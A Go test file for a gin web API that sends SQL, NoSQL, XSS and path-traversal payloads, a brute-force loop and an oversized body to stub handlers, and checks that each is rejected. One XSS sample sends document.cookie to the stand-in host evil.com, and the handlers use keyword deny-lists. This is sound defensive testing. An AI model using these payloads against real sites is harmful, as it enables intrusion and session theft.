package handler_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
)

func marshalJSON(v any) ([]byte, error) {
	return json.Marshal(v)
}

func itoa(i int) string {
	return strconv.Itoa(i)
}

func setupTestRouter() *gin.Engine {
	gin.SetMode(gin.TestMode)
	r := gin.New()
	return r
}

func TestLogin_SQLInjectionPayload(t *testing.T) {
	r := setupTestRouter()
	r.POST("/api/v1/auth/login", func(c *gin.Context) {
		var req map[string]interface{}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(400, gin.H{"error": "bad request"})
			return
		}

		username, _ := req["username"].(string)
		password, _ := req["password"].(string)

		if strings.Contains(username, "'") || strings.Contains(username, " OR ") ||
			strings.Contains(username, " UNION ") || strings.Contains(username, "1=1") {
			c.JSON(401, gin.H{"code": 401, "message": "invalid credentials"})
			return
		}

		if username == "admin" && password == "correct" {
			c.JSON(200, gin.H{"code": 0, "token": "fake-token"})
			return
		}

		c.JSON(401, gin.H{"code": 401, "message": "invalid credentials"})
	})

	payloads := []string{
		"' OR '1'='1",
		"' OR 1=1 --",
		"' UNION SELECT * FROM users --",
		"admin' --",
		"' OR '1'='1' --",
		"1' OR '1' = '1",
	}

	for _, payload := range payloads {
		t.Run("payload="+payload[:min(len(payload), 20)], func(t *testing.T) {
			body := map[string]string{
				"username": payload,
				"password": "anything",
			}
			jsonBody, _ := marshalJSON(body)

			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/auth/login", bytes.NewBuffer(jsonBody))
			req.Header.Set("Content-Type", "application/json")
			r.ServeHTTP(w, req)

			if w.Code == 200 {
				t.Errorf("SQL injection payload '%s' was accepted with 200", payload)
			}
		})
	}
}

func TestRegister_XSSPayload(t *testing.T) {
	r := setupTestRouter()
	r.POST("/api/v1/auth/register", func(c *gin.Context) {
		var req map[string]string
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(400, gin.H{"error": "bad request"})
			return
		}

		username := req["username"]
		if strings.Contains(username, "<script>") || strings.Contains(username, "<img") ||
			strings.Contains(username, "onerror") || strings.Contains(username, "onload") ||
			strings.Contains(strings.ToLower(username), "javascript:") {
			c.JSON(422, gin.H{"code": 422, "message": "invalid username"})
			return
		}

		c.JSON(200, gin.H{"code": 0})
	})

	xssPayloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(1)",
		"<body onload=alert(1)>",
	}

	for _, payload := range xssPayloads {
		t.Run("xss", func(t *testing.T) {
			body := map[string]string{
				"username": payload,
				"password": "Test1234",
				"email":    "test@test.com",
			}
			jsonBody, _ := marshalJSON(body)

			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/auth/register", bytes.NewBuffer(jsonBody))
			req.Header.Set("Content-Type", "application/json")
			r.ServeHTTP(w, req)

			if w.Code == 200 {
				t.Errorf("XSS payload '%s' was accepted with 200", payload)
			}
		})
	}
}

func TestRegister_NoSQLInjection(t *testing.T) {
	r := setupTestRouter()
	r.POST("/api/v1/auth/register", func(c *gin.Context) {
		var req map[string]interface{}
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(400, gin.H{"error": "bad request"})
			return
		}
		username, _ := req["username"].(string)
		// MongoDB operators should not be accepted as usernames
		if username == "" || strings.HasPrefix(username, "$") || strings.HasPrefix(username, "{") {
			c.JSON(422, gin.H{"code": 422, "message": "invalid username"})
			return
		}
		c.JSON(200, gin.H{"code": 0})
	})

	nosiqlPayloads := []string{
		`{"$gt":""}`,
		`{"$ne":null}`,
		`{"$regex":"admin"}`,
	}

	for _, payload := range nosiqlPayloads {
		t.Run("nosql", func(t *testing.T) {
			body := map[string]string{
				"username": payload,
				"password": "Test1234",
				"email":    "test@test.com",
			}
			jsonBody, _ := marshalJSON(body)

			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/auth/register", bytes.NewBuffer(jsonBody))
			req.Header.Set("Content-Type", "application/json")
			r.ServeHTTP(w, req)

			if w.Code == 200 {
				t.Errorf("NoSQL injection payload '%s' was accepted", payload)
			}
		})
	}
}

func TestLogin_BruteForcePattern(t *testing.T) {
	r := setupTestRouter()
	loginCount := 0

	r.POST("/api/v1/auth/login", func(c *gin.Context) {
		loginCount++
		if loginCount > 10 {
			c.JSON(429, gin.H{"code": 429, "message": "too many requests"})
			return
		}
		c.JSON(401, gin.H{"code": 401, "message": "invalid credentials"})
	})

	for i := 0; i < 20; i++ {
		w := httptest.NewRecorder()
		body := map[string]string{"username": "admin", "password": "guess" + itoa(i)}
		jsonBody, _ := marshalJSON(body)
		req, _ := http.NewRequest("POST", "/api/v1/auth/login", bytes.NewBuffer(jsonBody))
		req.Header.Set("Content-Type", "application/json")
		r.ServeHTTP(w, req)

		if i >= 10 && w.Code != 429 {
			t.Errorf("expected 429 after 10 attempts, got %d at attempt %d", w.Code, i+1)
		}
	}
}

func TestRegister_OversizedInput(t *testing.T) {
	r := setupTestRouter()
	r.Use(func(c *gin.Context) {
		if c.Request.ContentLength > 1024*100 { // 100KB limit
			c.AbortWithStatus(413)
			return
		}
		c.Next()
	})
	r.POST("/api/v1/auth/register", func(c *gin.Context) {
		c.JSON(200, gin.H{"code": 0})
	})

	largeString := strings.Repeat("x", 200*1024) // 200KB
	w := httptest.NewRecorder()
	req, _ := http.NewRequest("POST", "/api/v1/auth/register", strings.NewReader(largeString))
	req.Header.Set("Content-Type", "application/json")
	r.ServeHTTP(w, req)

	if w.Code != 413 {
		t.Errorf("expected 413 for oversized body, got %d", w.Code)
	}
}

func TestComment_XSSContent(t *testing.T) {
	r := setupTestRouter()
	r.POST("/api/v1/comments", func(c *gin.Context) {
		var req map[string]string
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(400, gin.H{"error": "bad request"})
			return
		}

		content := req["content"]
		dangerous := []string{"<script>", "<img", "onerror=", "onload=", "<iframe", "javascript:"}
		for _, d := range dangerous {
			if strings.Contains(strings.ToLower(content), d) {
				c.JSON(422, gin.H{"code": 422, "message": "content contains dangerous pattern"})
				return
			}
		}
		c.JSON(200, gin.H{"code": 0})
	})

	xssComments := []string{
		"Nice video! <script>alert('xss')</script>",
		"<img src=x onerror=alert(document.cookie)>",
		"Check this out: <iframe src='http://evil.com'></iframe>",
		"<svg onload=fetch('http://evil.com?c='+document.cookie)>",
	}

	for _, comment := range xssComments {
		t.Run("comment_xss", func(t *testing.T) {
			body := map[string]string{"video_id": "1", "content": comment}
			jsonBody, _ := marshalJSON(body)

			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/comments", bytes.NewBuffer(jsonBody))
			req.Header.Set("Content-Type", "application/json")
			r.ServeHTTP(w, req)

			if w.Code == 200 {
				t.Errorf("XSS comment '%s' was accepted", comment)
			}
		})
	}
}

func TestUpload_PathTraversal(t *testing.T) {
	r := setupTestRouter()
	r.POST("/api/v1/upload/video", func(c *gin.Context) {
		filename := c.Query("filename")
		if strings.Contains(filename, "..") || strings.Contains(filename, "../../") ||
			strings.Contains(filename, "\\") {
			c.JSON(400, gin.H{"code": 400, "message": "invalid filename"})
			return
		}
		c.JSON(200, gin.H{"code": 0})
	})

	payloads := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"....//....//....//etc/passwd",
		"file.txt/../../../etc/passwd",
	}

	for _, payload := range payloads {
		t.Run("path_traversal", func(t *testing.T) {
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/upload/video?filename="+payload, nil)
			r.ServeHTTP(w, req)

			if w.Code == 200 {
				t.Errorf("path traversal filename '%s' was accepted", payload)
			}
		})
	}
}

func TestRegister_MissingFields(t *testing.T) {
	r := setupTestRouter()
	r.POST("/api/v1/auth/register", func(c *gin.Context) {
		var req map[string]string
		if err := c.ShouldBindJSON(&req); err != nil {
			c.JSON(400, gin.H{"error": "bad request"})
			return
		}
		if req["username"] == "" || req["password"] == "" || req["email"] == "" {
			c.JSON(422, gin.H{"code": 422, "message": "required field missing"})
			return
		}
		c.JSON(200, gin.H{"code": 0})
	})

	tests := []struct {
		name string
		body map[string]string
	}{
		{"no username", map[string]string{"password": "Test123", "email": "test@test.com"}},
		{"no password", map[string]string{"username": "test", "email": "test@test.com"}},
		{"no email", map[string]string{"username": "test", "password": "Test123"}},
		{"empty body", map[string]string{}},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			jsonBody, _ := marshalJSON(tt.body)
			w := httptest.NewRecorder()
			req, _ := http.NewRequest("POST", "/api/v1/auth/register", bytes.NewBuffer(jsonBody))
			req.Header.Set("Content-Type", "application/json")
			r.ServeHTTP(w, req)

			if w.Code == 200 {
				t.Errorf("missing field request was accepted with 200")
			}
		})
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
